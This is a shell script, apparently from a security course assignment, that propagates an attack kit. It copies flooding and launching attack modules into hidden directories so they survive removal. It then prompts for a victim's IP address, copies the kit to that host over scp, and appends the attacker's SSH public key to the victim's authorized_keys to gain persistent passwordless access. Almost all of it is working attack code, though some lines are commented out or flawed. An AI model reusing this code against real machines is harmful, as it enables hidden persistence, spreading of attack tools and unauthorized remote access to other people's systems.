# task2
# replication attack file to two hidden files
Hidden1="../../.etc/.qq"
mkdir -p $Hidden1
cp ./Infect/Flooding_Attack $Hidden1
cp ./Infect/Check_Attack $Hidden1
cp ./Infect/Launching_Attack $Hidden1

Hidden2="../../.Launch_Attack"
mkdir -p $Hidden2
cp ./Infect/Launching_Attack $Hidden2

# When one of attack modules is removed, the attack can still be launched by the other

# trigger automatically every 1 minute, if it is not running


# task3
# input victim's IP address
read -p "Enter Victim IP Address: " IP_Address
scp -r ./Infect victim@"$IP_Address":/home/victim/Desktop/

# publickey
SSH_PATH="/home/victim/.ssh" #"/root/.ssh"

#mkdir -p "$SSH_PATH"/id_rsa.pub
#mkdir -p "$SSH_PATH"/authorized_keys

#chmod 700 "$SSH_PATH"
ssh-keygen
#ssh victim@"$IP_Address" 'mkdir -p "$SSH_PATH";cat >> "$SSH_PATH"/authorized_keys' < "$SSH_PATH"/id_rsa.pub
#ssh-copy-id victim@"$IP_Address"
#ssh-copy-id -i "$SSH_PATH" victim@"$IP_Address"
#ssh victim@"$IP_Address"

chmod 777 ~/.ssh/id_rsa.pub
scp ~/.ssh/id_rsa.pub victim@"$IP_Address":~/.ssh/
#scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
ssh victim@"$IP_Address" 'cat "$SSH_PATH"/id_rsa.pub >> "$SSH_PATH"/authorized_keys;
			chmod 700 "$SSH_PATH";
			chmod 644 "$SSH_PATH"/authorized_keys;
			ll -d "$SSH_PATH";
			ll "$SSH_PATH"/authorized_keys;
			exit;'
ssh victim@"$IP_Address"